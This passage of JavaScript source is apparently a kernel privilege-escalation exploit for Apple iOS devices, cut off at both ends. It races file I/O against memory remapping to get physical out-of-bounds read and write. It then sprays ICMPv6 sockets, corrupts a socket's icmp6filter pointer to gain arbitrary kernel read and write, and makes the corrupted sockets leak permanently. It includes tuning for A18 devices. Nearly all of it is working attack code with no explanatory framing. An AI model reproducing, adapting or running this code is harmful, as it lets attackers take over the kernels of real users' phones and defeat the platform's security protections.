95, 115, 121, 110, 99, 95, 112, 116, 114, 41, 59, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 47, 47, 32, 65, 108, 108, 111, 99, 97, 116, 101, 32, 97, 32, 110, 101, 119, 32, 110, 111, 110, 45, 99, 111, 110, 116, 105, 103, 117, 111, 117, 115, 32, 109, 97, 112, 32, 101, 110, 116, 114, 121, 32, 40, 111, 112, 116, 105, 111, 110, 97, 108, 108, 121, 32, 117, 115, 105, 110, 103, 32, 97, 32, 109, 101, 109, 111, 114, 121, 32, 111, 98, 106, 101, 99, 116, 41, 10, 32, 32, 32, 32, 32, 32, 32, 32, 107, 114, 32, 61, 32, 109, 97, 99, 104, 95, 118, 109, 95, 109, 97, 112, 40, 109, 97, 99, 104, 95, 116, 97, 115, 107, 95, 115, 101, 108, 102, 40, 41, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 103, 101, 116, 95, 98, 105, 103, 105, 110, 116, 95, 97, 100, 100, 114, 40, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 41, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 105, 122, 101, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 70, 73, 88, 69, 68, 32, 124, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 79, 86, 69, 82, 87, 82, 73, 84, 69, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 111, 102, 102, 115, 101, 116, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 86, 77, 95, 80, 82, 79, 84, 95, 68, 69, 70, 65, 85, 76, 84, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 86, 77, 95, 80, 82, 79, 84, 95, 68, 69, 70, 65, 85, 76, 84, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 86, 77, 95, 73, 78, 72, 69, 82, 73, 84, 95, 78, 79, 78, 69, 41, 59, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 105, 102, 32, 40, 107, 114, 32, 33, 61, 32, 75, 69, 82, 78, 95, 83, 85, 67, 67, 69, 83, 83, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 76, 79, 71, 40, 34, 91, 45, 93, 32, 109, 97, 99, 104, 95, 118, 109, 95, 109, 97, 112, 32, 102, 97, 105, 108, 101, 100, 32, 33, 33, 33, 34, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 76, 79, 71, 40, 34, 91, 43, 93, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 58, 32, 34, 32, 43, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 46, 104, 101, 120, 40, 41, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 76, 79, 71, 40, 34, 91, 43, 93, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 58, 32, 34, 32, 43, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 46, 104, 101, 120, 40, 41, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 101, 120, 105, 116, 40, 48, 110, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 114, 97, 99, 101, 95, 115, 121, 110, 99, 95, 112, 116, 114, 44, 32, 48, 110, 41, 59, 10, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 47, 47, 32, 101, 110, 97, 98, 108, 101, 95, 103, 99, 40, 41, 59, 10, 125, 10, 10, 102, 114, 101, 101, 95, 116, 104, 114, 101, 97, 100, 40, 41, 59, 0]);
    let free_thread_js = 0n;
    if (free_thread_js == 0n) {
      free_thread_js = free_thread_js_data;
    }
    free_thread_jsthread = js_thread_spawn(free_thread_js, free_thread_arg);
  }
  let default_file_content = calloc(1n, target_file_size);
  memset_pattern8(default_file_content, get_bigint_addr(random_marker), target_file_size);
  function create_target_file(path) {
    let fd = fopen(path, get_cstring("w"));
    let written = fwrite(default_file_content, 1n, target_file_size, fd);
    fclose(fd);
  }
  function create_physically_contiguous_mapping(port, address, size) {
    let dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0n, kCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks);
    let cf_number = CFNumberCreate(kCFAllocatorDefault, 9n, get_bigint_addr(size));
    res = CFDictionarySetValue(dict, kIOSurfaceAllocSize, cf_number);
    let cfstring = create_cfstring(get_cstring("PurpleGfxMem"));
    res = CFDictionarySetValue(dict, create_cfstring(get_cstring("IOSurfaceMemoryRegion")), cfstring);
    let surface = IOSurfaceCreate(dict);
    CFRelease(dict);
    if (surface == 0n) {
      LOG("[-] Failed to create surface!!!");
      exit(0n);
    }
    let physical_mapping_address = IOSurfaceGetBaseAddress(surface);
    LOG("[+] physical_mapping_address: " + physical_mapping_address.hex());
    let memory_object = new_bigint();
    let kr = mach_make_memory_entry_64(mach_task_self(), get_bigint_addr(size), physical_mapping_address, VM_PROT_DEFAULT, get_bigint_addr(memory_object), 0n);
    if (kr != KERN_SUCCESS) {
      LOG("[-] mach_make_memory_entry_64 failed!!!");
      exit(0n);
    }
    let new_mapping_address = new_bigint();
    kr = mach_vm_map(mach_task_self(), get_bigint_addr(new_mapping_address), size, 0n, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, memory_object, 0n, 0n, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) {
      LOG("[-] mach_vm_map failed!!!");
      exit(0n);
    }
    CFRelease(surface);
    uwrite64(port, memory_object);
    uwrite64(address, new_mapping_address);
  }
  function initialize_physical_read_write(contiguous_mapping_size) {
    pc_size = contiguous_mapping_size;
    create_physically_contiguous_mapping(get_bigint_addr(pc_object), get_bigint_addr(pc_address), pc_size);
    LOG("[+] pc_object: " + pc_object.hex());
    LOG("[+] pc_address: " + pc_address.hex());
    memset_pattern8(pc_address, get_bigint_addr(random_marker), pc_size);
    free_target = pc_address;
    free_target_size = pc_size;
    uwrite64(free_target_sync_ptr, free_target);
    uwrite64(free_target_size_sync_ptr, free_target_size);
    uwrite64(free_thread_start_ptr, 1n);
    uwrite64(go_sync_ptr, 1n);
  }
  let iov = calloc(1n, 0x10n);
  let highiest_success_idx = 0n;
  let success_read_count = 0n;
  function physical_oob_read_mo(mo, mo_offset, size, offset, buffer) {
    uwrite64(target_object_sync_ptr, mo);
    uwrite64(target_object_offset_sync_ptr, mo_offset);
    uwrite64(iov + 0x00n, pc_address + 0x3f00n);
    uwrite64(iov + 0x08n, offset + size);
    uwrite64(buffer, random_marker);
    uwrite64(pc_address + 0x3f00n + offset, random_marker);
    let read_race_succeeded = false;
    let w = 0n;
    for (let try_idx = 0n; try_idx < highiest_success_idx + 100n; try_idx++) {
      uwrite64(race_sync_ptr, 1n);
      w = pwritev(read_fd, iov, 1n, 0x3f00n);
      cmp8_wait_for_change(race_sync_ptr, 1);
      kr = mach_vm_map(mach_task_self(), get_bigint_addr(pc_address), pc_size, 0n, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pc_object, 0n, 0n, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
      if (kr != KERN_SUCCESS) {
        LOG("[-] mach_vm_map failed!!!");
        exit(0n);
      }
      if (w == 0xFFFFFFFFFFFFFFFFn) {
        let r = pread(read_fd, buffer, size, 0x3f00n + offset);
        let marker = uread64(buffer);
        if (marker != random_marker) {
          read_race_succeeded = true;
          success_read_count += 0x1n;
          if (try_idx > highiest_success_idx) {
            highiest_success_idx = try_idx;
          }
          break;
        } else {
          usleep(1n);
        }
      }
      if (try_idx == 500n) {
        break;
      }
    }
    uwrite64(target_object_sync_ptr, 0n);
    if (read_race_succeeded == false) {
      return 1n;
    }
    return KERN_SUCCESS;
  }
  function physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer) {
    while (true) {
      kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
      if (kr == KERN_SUCCESS) {
        break;
      }
    }
  }
  function physical_oob_write_mo(mo, mo_offset, size, offset, buffer) {
    uwrite64(target_object_sync_ptr, mo);
    uwrite64(target_object_offset_sync_ptr, mo_offset);
    uwrite64(iov + 0x00n, pc_address + 0x3f00n);
    uwrite64(iov + 0x08n, offset + size);
    pwrite(write_fd, buffer, size, 0x3f00n + offset);
    for (let try_idx = 0n; try_idx < 20n; try_idx++) {
      uwrite64(race_sync_ptr, 1n);
      preadv(write_fd, iov, 1n, 0x3f00n);
      cmp8_wait_for_change(race_sync_ptr, 1);
      kr = mach_vm_map(mach_task_self(), get_bigint_addr(pc_address), pc_size, 0n, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pc_object, 0n, 0n, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
      if (kr != KERN_SUCCESS) {
        LOG("[-] mach_vm_map failed!!!");
        exit(0n);
      }
    }
    uwrite64(target_object_sync_ptr, 0n);
    return;
  }
  let control_socket = 0n;
  let rw_socket = 0n;
  let control_socket_pcb = 0n;
  let rw_socket_pcb = 0n;
  let EARLY_KRW_LENGTH = 0x20n;
  let control_data = calloc(1n, EARLY_KRW_LENGTH);
  function set_target_kaddr(where) {
    memset(control_data, 0n, EARLY_KRW_LENGTH);
    uwrite64(control_data, where);
    let res = setsockopt(control_socket, IPPROTO_ICMPV6, ICMP6_FILTER, control_data, EARLY_KRW_LENGTH);
    if (res != 0n) {
      LOG("[-] setsockopt failed!!!");
      exit(0n);
    }
  }
  function early_kread(where, read_buf, size) {
    if (size > EARLY_KRW_LENGTH) {
      LOG("[!] error: (size > EARLY_KRW_LENGTH)");
      exit(0n);
    }
    set_target_kaddr(where);
    let read_data_length = BigInt(size);
    res = getsockopt(rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, read_buf, get_bigint_addr(read_data_length));
    if (res != 0n) {
      LOG("[-] getsockopt failed!!!");
      exit(0n);
    }
  }
  function early_kread64(where) {
    let value = new_bigint();
    let res = early_kread(where, get_bigint_addr(value), 0x8n);
    return update_bigint(value);
  }
  function early_kwrite32bytes(where, write_buf) {
    set_target_kaddr(where);
    let res = setsockopt(rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, write_buf, EARLY_KRW_LENGTH);
    if (res != 0n) {
      LOG("[-] setsockopt failed!!!");
      exit(0n);
    }
  }
  let early_kwrite64_write_buf = calloc(1n, EARLY_KRW_LENGTH);
  function early_kwrite64(where, what) {
    early_kread(where, early_kwrite64_write_buf, EARLY_KRW_LENGTH);
    uwrite64(early_kwrite64_write_buf, what);
    early_kwrite32bytes(where, early_kwrite64_write_buf);
  }
  function kread_length(address, buffer, size) {
    let remaining = BigInt(size);
    let read_offset = 0n;
    let read_size = 0n;
    while (remaining != 0n) {
      if (remaining >= EARLY_KRW_LENGTH) {
        read_size = EARLY_KRW_LENGTH;
      } else {
        read_size = remaining % EARLY_KRW_LENGTH;
      }
      early_kread(address + read_offset, buffer + read_offset, read_size);
      remaining -= read_size;
      read_offset += read_size;
    }
  }
  let kwrite_length_buffer = calloc(1n, EARLY_KRW_LENGTH);
  function kwrite_length(dst, src, size) {
    let remaining = BigInt(size);
    let write_offset = 0n;
    let write_size = 0n;
    while (remaining != 0n) {
      if (remaining >= EARLY_KRW_LENGTH) {
        write_size = EARLY_KRW_LENGTH;
      } else {
        write_size = remaining % EARLY_KRW_LENGTH;
      }
      let kwrite_dst_addr = dst + write_offset;
      let kwrite_src_addr = src + write_offset;
      if (write_size != EARLY_KRW_LENGTH) {
        kread_length(kwrite_dst_addr, kwrite_length_buffer, EARLY_KRW_LENGTH);
      }
      memcpy(kwrite_length_buffer, kwrite_src_addr, write_size);
      early_kwrite32bytes(kwrite_dst_addr, kwrite_length_buffer);
      remaining -= write_size;
      write_offset += write_size;
    }
  }
  function kwrite_zone_element(dst, src, len) {
    let CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE = 0x20n;
    if (len < CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) {
      LOG("kwrite_zone_element supports only zone element size >= 0x20");
      return false;
    }
    let write_size = 0n;
    let write_offset = 0n;
    let remaining = BigInt(len);
    while (remaining != 0n) {
      write_size = remaining >= CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE ? CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE : remaining % CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE;
      let kwrite_dst_addr = dst + write_offset;
      let kwrite_src_addr = src + write_offset;
      if (write_size != CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) {
        let adjust = CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE - write_size;
        kwrite_dst_addr -= adjust;
        kwrite_src_addr -= adjust;
      }
      kwrite_length(kwrite_dst_addr, kwrite_src_addr, CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE);
      remaining -= write_size;
      write_offset += write_size;
    }
    return true;
  }
  function kdump(where, size, msg = "") {
    LOG(`[+] ----------- ${msg} ----------`);
    for (let i = 0n; i < size; i += 0x10n) {
      LOG(`[+] [${i.hex()}] ${(where + i).hex()}:\t${early_kread64(where + i).hex()} ${early_kread64(where + i + 8n).hex()}`);
    }
  }
  function krw_sockets_leak_forever() {
    let offset_pcb_socket = 0x40n;
    let offset_socket_so_count = 0x254n;
    let control_socket_addr = early_kread64(control_socket_pcb + offset_pcb_socket);
    let rw_socket_addr = early_kread64(rw_socket_pcb + offset_pcb_socket);
    if (control_socket_addr == 0n || rw_socket_addr == 0n) {
      LOG("[-] Couldn't find control_socket_addr || rw_socket_addr");
      exit(0n);
    }
    let control_socket_so_count = early_kread64(control_socket_addr + offset_socket_so_count);
    let rw_socket_so_count = early_kread64(rw_socket_addr + offset_socket_so_count);
    early_kwrite64(control_socket_addr + offset_socket_so_count, control_socket_so_count + 0x0000100100001001n);
    early_kwrite64(rw_socket_addr + offset_socket_so_count, rw_socket_so_count + 0x0000100100001001n);
    let icmp6filt_offset = 0x148n;
    early_kwrite64(rw_socket_pcb + icmp6filt_offset + 0x8n, 0n);
  }
  let socket_ports = [];
  let socket_pcb_ids = [];
  let socket_ports_count = 0n;
  let getsockopt_read_length = 32n;
  let getsockopt_read_data = calloc(1n, getsockopt_read_length);
  let socket_info = calloc(1n, 0x400n);
  function spray_socket(socket_ports, socket_pcb_ids) {
    let fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
    if (fd == 0xFFFFFFFFFFFFFFFFn) {
      LOG("[-] socket create failed!!!");
      return fd;
    }
    let output_socket_port = new_bigint();
    fileport_makeport(fd, get_bigint_addr(output_socket_port));
    close(fd);
    let r = syscall(336n, 6n, getpid(), 3n, output_socket_port, socket_info, 0x400n);
    let inp_gencnt = uread64(socket_info + 0x110n);
    socket_ports.push(output_socket_port);
    socket_pcb_ids.push(inp_gencnt);
    return output_socket_port;
  }
  function sockets_release() {
    for (let sock_idx = 0n; sock_idx < socket_ports_count; sock_idx++) {
      let port = socket_ports.pop();
      mach_port_deallocate(mach_task_self(), port);
      socket_pcb_ids.pop();
    }
    socket_ports_count = 0n;
  }
  function create_surface_with_address(address, size) {
    let properties = CFDictionaryCreateMutable(kCFAllocatorDefault, 0n, kCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks);
    let address_ptr = new_uint64_t(address);
    let address_number = CFNumberCreate(kCFAllocatorDefault, 11n, address_ptr);
    CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfaceAddress")), address_number);
    let size_ptr = new_uint64_t(size);
    let size_number = CFNumberCreate(kCFAllocatorDefault, 9n, size_ptr);
    CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfaceAllocSize")), size_number);
    let surface = IOSurfaceCreate(properties);
    IOSurfacePrefetchPages(surface);
    free(address_ptr);
    free(size_ptr);
    CFRelease(address_number);
    CFRelease(size_number);
    CFRelease(properties);
    return surface;
  }
  let mlock_dict = {};
  function surface_mlock(address, size) {
    let surf = create_surface_with_address(address, size);
    mlock_dict[address] = surf;
  }
  function surface_munlock(address, size) {
    if (mlock_dict[address] != undefined) {
      CFRelease(mlock_dict[address]);
    }
    mlock_dict[address] = undefined;
  }
  function find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, do_read = true) {
    if (do_read == true) {
      physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
    }
    let search_start_idx = 0n;
    let target_found = false;
    let pcb_start_offset = 0n;
    let icmp6filt_offset = 0x148n;
    let found = 0n;
    do {
      found = memmem(read_buffer + search_start_idx, oob_size - search_start_idx, executable_name, strlen(executable_name));
      if (found != 0n) {
        pcb_start_offset = found - read_buffer & 0xFFFFFFFFFFFFFC00n;
        if (uread64(read_buffer + pcb_start_offset + icmp6filt_offset + 0x8n) == 0x0000ffffffffffffn) {
          target_found = true;
          break;
        }
      }
      search_start_idx += 0x400n;
    } while (found != 0n && search_start_idx < oob_size);
    if (target_found == true) {
      LOG("[+] pcb_start_offset: " + pcb_start_offset.hex());
      let target_inp_gencnt = uread64(read_buffer + pcb_start_offset + 0x78n);
      LOG("[+] target_inp_gencnt: " + target_inp_gencnt.hex());
      if (target_inp_gencnt == socket_pcb_ids[socket_ports_count - 1n]) {
        LOG(`[-] Found last PCB`);
        return -1n;
      }
      let is_our_pcb = false;
      let control_socket_idx = undefined;
      for (let sock_idx = 0n; sock_idx < socket_ports_count; sock_idx++) {
        if (socket_pcb_ids[sock_idx] == target_inp_gencnt) {
          is_our_pcb = true;
          control_socket_idx = sock_idx;
          break;
        }
      }
      if (is_our_pcb == false) {
        LOG(`[-] Found freed PCB Page!`);
        return -1n;
      }
      if (target_inp_gencnt_list.includes(target_inp_gencnt)) {
        LOG(`[-] Found old PCB Page!!!!`);
        return -1n;
      } else {
        target_inp_gencnt_list.push(target_inp_gencnt);
      }
      let inp_list_next_pointer = uread64(read_buffer + pcb_start_offset + 0x28n) - 0x20n;
      let icmp6filter = uread64(read_buffer + pcb_start_offset + icmp6filt_offset);
      LOG("[+] inp_list_next_pointer: " + inp_list_next_pointer.hex());
      LOG("[+] icmp6filter: " + icmp6filter.hex());
      rw_socket_pcb = BigInt(inp_list_next_pointer);
      memcpy(write_buffer, read_buffer, oob_size);
      uwrite64(write_buffer + pcb_start_offset + icmp6filt_offset, inp_list_next_pointer + icmp6filt_offset);
      uwrite64(write_buffer + pcb_start_offset + icmp6filt_offset + 0x8n, 0n);
      LOG("[+] Corrupting icmp6filter pointer...");
      while (true) {
        physical_oob_write_mo(memory_object, seeking_offset, oob_size, oob_offset, write_buffer);
        physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
        let new_icmp6filter = uread64(read_buffer + pcb_start_offset + icmp6filt_offset);
        if (new_icmp6filter == inp_list_next_pointer + icmp6filt_offset) {
          LOG("[+] target corrupted: " + uread64(read_buffer + pcb_start_offset + icmp6filt_offset).hex());
          break;
        }
      }
      let sock = fileport_makefd(socket_ports[control_socket_idx]);
      let res = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, getsockopt_read_data, get_bigint_addr(getsockopt_read_length));
      if (res != 0n) {
        LOG("[-] getsockopt failed!!!");
        exit(0n);
      }
      let marker = uread64(getsockopt_read_data);
      if (marker != 0xffffffffffffffffn) {
        LOG("[+] Found control_socket at idx: " + control_socket_idx.hex());
        control_socket = sock;
        rw_socket = fileport_makefd(socket_ports[control_socket_idx + 0x1n]);
        return KERN_SUCCESS;
      } else {
        LOG("[-] Failed to corrupt control_socket at idx: " + control_socket_idx.hex());
      }
    }
    return -1n;
  }
  let kernel_base = 0n;
  let kernel_slide = 0n;
  let is_a18_devices = false;
  function pe_v1() {
    LOG("[PE-DBG] pe_v1() entered");
    let n_of_total_search_mapping_pages = 0x1000n * 0x10n;
    if (is_a18_devices) {
      n_of_total_search_mapping_pages = 0x10n * 0x10n;
    }
    let search_mapping_size = 0x2000n * PAGE_SIZE;
    if (is_a18_devices) {
      search_mapping_size = 0x10n * PAGE_SIZE;
    }
    let total_search_mapping_size = n_of_total_search_mapping_pages * PAGE_SIZE;
    let n_of_search_mappings = total_search_mapping_size / search_mapping_size;
    LOG("[PE-DBG] pe_v1: allocating buffers...");
    let read_buffer = calloc(1n, oob_size);
    let write_buffer = calloc(1n, oob_size);
    LOG("[PE-DBG] pe_v1: calling initialize_physical_read_write...");
    initialize_physical_read_write(n_of_oob_pages * PAGE_SIZE);
    LOG("[PE-DBG] pe_v1: physical r/w initialized");
    let wired_mapping = new_bigint();
    let wired_mapping_size = 1024n * 1024n * 1024n * 3n;
    if (is_a18_devices) {
      kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(wired_mapping), wired_mapping_size, VM_FLAGS_ANYWHERE);
      LOG(`[+] wired_mapping: ${wired_mapping.hex()}`);
    }
    let target_inp_gencnt_list = [];
    LOG("[PE-DBG] pe_v1: entering main loop");
    while (true) {
      if (is_a18_devices) {
        surface_mlock(wired_mapping, wired_mapping_size);
        for (let s = 0n; s < wired_mapping_size / 0x4000n; s++) {
          uwrite64(wired_mapping + s * 0x4000n, 0n);
        }
      }
      LOG("[PE-DBG] pe_v1: allocating search mappings...");
      let search_mappings = [];
      for (let s = 0n; s < n_of_search_mappings; s++) {
        let search_mapping_address = new_bigint();
        kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(search_mapping_address), search_mapping_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
        if (kr != KERN_SUCCESS) {
          LOG("[-] mach_vm_allocate failed!!!");
          exit(0n);
        }
        for (let k = 0n; k < search_mapping_size; k += PAGE_SIZE) {
          uwrite64(search_mapping_address + k, random_marker);
        }
        search_mappings.push(search_mapping_address);
      }
      LOG("[PE-DBG] pe_v1: search mappings done, spraying sockets...");
      socket_ports = [];
      socket_pcb_ids = [];
      socket_ports_count = 0n;
      const OPEN_MAX = 10240n;
      let maxfiles = 3n * OPEN_MAX;
      let leeway = 4096n * 2n;
      for (let socket_count = 0n; socket_count < maxfiles - leeway; socket_count++) {
        let port = spray_socket(socket_ports, socket_pcb_ids);
        if (port == 0xFFFFFFFFFFFFFFFFn) {
          LOG("[-] Failed to spray sockets: " + socket_ports_count.hex());
          break;
        } else {
          socket_ports_count++;
        }
      }
      LOG("[PE-DBG] pe_v1: socket spray done");
      let start_pcb_id = socket_pcb_ids[0];
      let end_pcb_id = socket_pcb_ids[socket_ports_count - 1n];
      LOG(`[i] socket_ports_count: ${socket_ports_count.hex()}`);
      LOG(`[i] start_pcb_id: ${start_pcb_id.hex()}`);
      LOG(`[i] end_pcb_id: ${end_pcb_id.hex()}`);
      LOG("[PE-DBG] pe_v1: searching mappings for socket PCB...");
      let success = false;
      for (let s = 0n; s < n_of_search_mappings; s++) {
        let search_mapping_address = search_mappings[s];
        if (s % 4n == 0n) LOG("[PE-DBG] pe_v1: search mapping " + s);
        let memory_object = new_bigint();
        let memory_object_size = BigInt(search_mapping_size);
        kr = mach_make_memory_entry_64(mach_task_self(), get_bigint_addr(memory_object_size), search_mapping_address, VM_PROT_DEFAULT, get_bigint_addr(memory_object), 0n);
        if (kr != 0n) {
          LOG("[-] mach_make_memory_entry_64 failed!!!");
          exit(0n);
        }
        surface_mlock(search_mapping_address, search_mapping_size);
        let seeking_offset = 0n;
        while (seeking_offset < search_mapping_size) {
          kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
          if (kr == KERN_SUCCESS) {
            if (find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, false) == KERN_SUCCESS) {
              success = true;
              break;
            }
          }
          seeking_offset += PAGE_SIZE;
        }
        kr = mach_port_deallocate(mach_task_self(), memory_object);
        if (kr != KERN_SUCCESS) {
          LOG("[-] mach_port_deallocate failed!!!");
          exit(0n);
        }
        if (success == true) {
          break;
        }
      }
      sockets_release();
      for (let s = 0n; s < n_of_search_mappings; s++) {
        let search_mapping_address = search_mappings.pop();
        kr = mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
      }
      if (is_a18_devices) {
        surface_munlock(wired_mapping, wired_mapping_size);
      }
      if (success == true) {
        break;
      }
    }
  }
  function pe_v2() {
    let read_buffer = calloc(1n, oob_size);
    let write_buffer = calloc(1n, oob_size);
    initialize_physical_read_write(n_of_oob_pages * PAGE_SIZE);
    let getsockopt_read_length = 32n;
    let getsockopt_read_data = calloc(1n, getsockopt_read_length);
    let wired_mapping_entry_size = PAGE_SIZE;
    let wired_mapping_entries_total_size = 1024n * 1024n * 1024n * 2n;
    let n_of_wired_mapping_entries = wired_mapping_entries_total_size / wired_mapping_entry_size;
    let wired_mapping_entries_addresses = [];
    LOG("[i] Allocating memory");
    let kr = KERN_SUCCESS;
    let wired_address = 0n;
    for (let i = 0n; i < n_of_wired_mapping_entries; i++) {
      if (i == 0n) {
        wired_address = new_bigint();
        do {
          kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(wired_address), wired_mapping_entry_size, VM_FLAGS_ANYWHERE);
        } while (kr != KERN_SUCCESS);
      } else {
        wired_address = BigInt(wired_mapping_entries_addresses.slice(-1));
        do {
          wired_address += wired_mapping_entry_size;
          kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(wired_address), wired_mapping_entry_size, VM_FLAGS_FIXED);
        } while (kr != KERN_SUCCESS);
      }
      wired_mapping_entries_addresses.push(wired_address);
      surface_mlock(wired_address, wired_mapping_entry_size);
      uwrite64(wired_address, wired_page_marker);
      uwrite64(wired_address + 0x8n, wired_address);
    }
    let target_inp_gencnt_list = [];
    LOG("[i] Allocating memory done");
    while (true) {
      let search_mapping_size = 0x800n * PAGE_SIZE;
      let search_mapping_address = new_bigint();
      kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(search_mapping_address), search_mapping_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
      if (kr != KERN_SUCCESS) {
        LOG("[-] mach_vm_allocate failed!!!");
        exit(0n);
      }
      for (let k = 0n; k < search_mapping_size; k += PAGE_SIZE) {
        uwrite64(search_mapping_address + k, random_marker);
      }
      surface_mlock(search_mapping_address, search_mapping_size);
      let memory_object = new_bigint();
      let memory_object_size = BigInt(search_mapping_size);
      kr = mach_make_memory_entry_64(mach_task_self(), get_bigint_addr(memory_object_size), search_mapping_address, VM_PROT_DEFAULT, get_bigint_addr(memory_object), 0n);
      if (kr != 0n) {
        LOG("[-] mach_make_memory_entry_64 failed!!!");
        exit(0n);
      }
      socket_ports = [];
      socket_pcb_ids = [];
      socket_ports_count = 0n;
      let max_sockets_count = 0x5800n;
      let split_count = 8n;
      let wired_pages = [];
      let success = false;
      let seeking_offset = 0n;
      while (seeking_offset < search_mapping_size) {
        kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
        if (kr != KERN_SUCCESS) {
          seeking_offset += PAGE_SIZE;
          continue;
        }
        if (uread64(read_buffer) == wired_page_marker) {
          let wired_page = uread64(read_buffer + 0x8n);
          LOG(`[i] seeking_offset: ${seeking_offset.hex()}: Found wired_page: ${wired_page.hex()}`);
          if (wired_pages.indexOf(wired_page) == -1) {
            wired_pages.push(wired_page);
            let idx = wired_mapping_entries_addresses.indexOf(wired_page);
            wired_mapping_entries_addresses.splice(idx, 1);
            uwrite64(wired_page, 0n);
            uwrite64(wired_page + 0x8n, 0n);
          } else {
            LOG(`[-] Found old wired page!!!!`);
            seeking_offset += PAGE_SIZE;
            continue;
          }
          kr = mach_vm_deallocate(mach_task_self(), wired_page, wired_mapping_entry_size);
          if (kr != KERN_SUCCESS) {
            LOG(`[-] Failed to deallocate wired page!!!!`);
          }
          for (let socket_count = 0n; socket_count < max_sockets_count / split_count; socket_count++) {
            let port = spray_socket(socket_ports, socket_pcb_ids);
            if (port == 0xFFFFFFFFFFFFFFFFn) {
              LOG("[-] Failed to spray sockets: " + socket_ports_count.hex());
              break;
            } else {
              socket_ports_count++;
            }
          }
          if (find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, true) == KERN_SUCCESS) {
            LOG(`[i] seeking_offset: ${seeking_offset.hex()}: Reallocated PCB page`);
            success = true;
            break;
          } else {
            if (socket_ports_count >= max_sockets_count) {
              sockets_release();
              LOG("[+] waiting for zone trimming...");
              sleep(20n);
            }
            seeking_offset = 0n;
          }
        } else if (find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, false) == KERN_SUCCESS) {
          LOG(`[i] seeking_offset: ${seeking_offset.hex()}: Found PCB page`);
          success = true;
          break;
        } else {
          seeking_offset += PAGE_SIZE;
        }
      }
